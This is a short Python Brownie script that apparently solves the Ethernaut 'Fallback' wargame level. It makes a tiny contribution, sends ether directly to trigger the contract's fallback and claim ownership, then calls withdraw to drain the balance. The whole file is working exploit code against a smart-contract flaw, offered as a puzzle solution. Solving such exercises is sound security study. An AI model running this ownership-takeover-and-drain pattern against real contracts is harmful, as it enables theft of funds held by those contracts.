from brownie import accounts, Contract, Fallback

INSTANCE_ADDRESS = "0xd7c878Ca1A60579C831bf88Edd8C32c772B78c5d"
ACCOUNT = "straul"


def get_account():
    account = accounts.load(ACCOUNT)
    return account


def hack_fallback(account):
    fallback = Contract.from_abi(name="Fallback", address=INSTANCE_ADDRESS, abi=Fallback.abi)

    fallback.contribute({'from': account, 'value': "0.000001 ether"})

    # claim ownership
    account.transfer(to=fallback.address, amount=1e10)

    # withdraw all funds
    fallback.withdraw({'from': account})

def main():
    account = get_account()
    hack_fallback(account)